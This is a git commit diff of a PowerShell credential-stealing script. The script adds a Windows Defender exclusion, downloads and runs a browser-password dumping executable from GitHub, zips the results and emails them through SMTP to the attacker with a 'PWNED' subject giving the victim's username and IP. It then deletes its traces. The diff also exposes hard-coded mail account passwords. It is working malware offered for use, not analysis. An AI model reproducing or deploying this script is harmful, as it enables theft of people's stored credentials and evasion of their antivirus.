5f496f129fcdfa9874f2a6c33e7a0063dacf5c3c
Sadienavalbej96 <sadienavalbej96@gmail.com>
2025-03-14 16:01:57 -0700

    Update and rename power.ps1 to sadpower.ps1

--- sadpower.ps1
+++ sadpower.ps1
@@ -1,32 +1,32 @@
 #Adding windows defender exclusionpath
 Add-MpPreference -ExclusionPath "$env:appdata"
 #Creating the directory we will work on
-mkdir "$env:appdata\Microsoft\dump"
-Set-Location "$env:appdata\Microsoft\dump"
+mkdir "$env:appdata\Gmail\dump"
+Set-Location "$env:appdata\Gmail\dump"
 #Downloading and executing hackbrowser.exe
 Invoke-WebRequest 'https://github.com/Real0xdom/venom/raw/master/hackbrowser.exe' -OutFile "hb.exe"
 .\hb.exe --format json
-Remove-Item -Path "$env:appdata\Microsoft\dump\hb.exe" -Force
+Remove-Item -Path "$env:appdata\Gmail\dump\hb.exe" -Force
 #Creating A Zip Archive
 Compress-Archive -Path * -DestinationPath dump.zip
 $Random = Get-Random
 #Mailing the output you will need to enable less secure app access on your google account for this to work
 $Message = new-object Net.Mail.MailMessage
-$smtp = new-object Net.Mail.SmtpClient("smtp.outlook.com", 587)
-$smtp.Credentials = New-Object System.Net.NetworkCredential("outlook_029241608A6F4CF@outlook.com", "$0xBomber!3197$");
+$smtp = new-object Net.Mail.SmtpClient("smtp.Gmail.com", 587)
+$smtp.Credentials = New-Object System.Net.NetworkCredential("sadienavalbej96@gmail.com", "Allison123456@ages");
 $smtp.EnableSsl = $true
-$Message.From = "outlook_029241608A6F4CF@outlook.com"
-$Message.To.Add("htshtuff@gmail.com")
+$Message.From = "sadienavalbej96@gmail.com"
+$Message.To.Add("sadienavalbej96@gmail.com")
 $ip = Invoke-RestMethod "myexternalip.com/raw"
 $Message.Subject = "Succesfully PWNED " + $env:USERNAME + "! (" + $ip + ")"
 $ComputerName = Get-CimInstance -ClassName Win32_ComputerSystem | Select Model,Manufacturer
 $Message.Body = $ComputerName
 $files=Get-ChildItem
-$Message.Attachments.Add("$env:appdata\Microsoft\dump\dump.zip")
+$Message.Attachments.Add("$env:appdata\Gmail\dump\dump.zip")
 $smtp.Send($Message)
 $Message.Dispose()
 $smtp.Dispose()
 #Cleanup
 cd "$env:appdata"
-Remove-Item -Path "$env:appdata\Microsoft\dump" -Force -Recurse
+Remove-Item -Path "$env:appdata\Gmail\dump" -Force -Recurse
 Remove-MpPreference -ExclusionPath "$env:appdata"
